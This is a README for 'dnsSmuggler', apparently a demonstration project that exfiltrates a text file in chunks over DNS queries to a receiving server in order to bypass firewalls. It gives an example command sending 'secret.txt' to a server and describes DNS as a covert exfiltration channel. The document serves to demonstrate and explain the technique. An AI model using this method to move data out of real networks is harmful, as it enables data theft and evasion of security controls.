# dnsSmuggler

## Overview

dnsSmuggler is a Python project demonstrating data smuggling over DNS (Domain Name System) queries. It consists of a client script and a server script. The client script reads a text file, breaks it into smaller chunks, and sends these chunks as DNS queries to a server. The server receives these DNS queries, reassembles the chunks, and reconstructs the original text file.

## Working Principle

The project works as follows:

1. **Client Side:**
   - The client reads the contents of a text file specified by the user.
   - It breaks the file content into smaller chunks to fit within the payload size limit of DNS queries.
   - Each chunk is sent as a separate DNS query to the specified DNS server.

2. **Server Side:**
   - The server listens for incoming DNS queries.
   - It receives the DNS queries containing the data chunks.
   - The server reassembles the chunks into the original file content.

## Usage

### Prerequisites

- Python 3.x
- Ensure that both client and server machines have access to DNS server.

### Running the Client

```bash
python client.py <file_path> <dns_server>
```
   - <file_path>: Path to the text file to be smuggled.
   - <dns_server>: DNS server's IP address or domain name.

### Running the Server
```bash
python server.py
```

### Example
```bash
python client.py secret.txt 192.168.1.1
```
```bash
python server.py
```
### Diagram
```lua
       +------------+                 +-------------+                +-------------+
       |    Client  |                 |   Firewall  |                |    Server   |
       +------------+                 +-------------+                +-------------+
            |                                 |                              |
            |           DNS Query             |                              |
            | ----------------------------->  |                              |
            |                                 |                              |
            |                                 |      DNS Query (Forwarded)   |
            |                                 | -------------------------->  |
            |                                 |                              |

```
In this scenario, DNS smuggling leverages the inherent trust in DNS traffic to bypass network firewalls. Firewalls typically allow DNS traffic to pass through unhindered, making it an effective covert channel for data exfiltration or bypassing network restrictions.
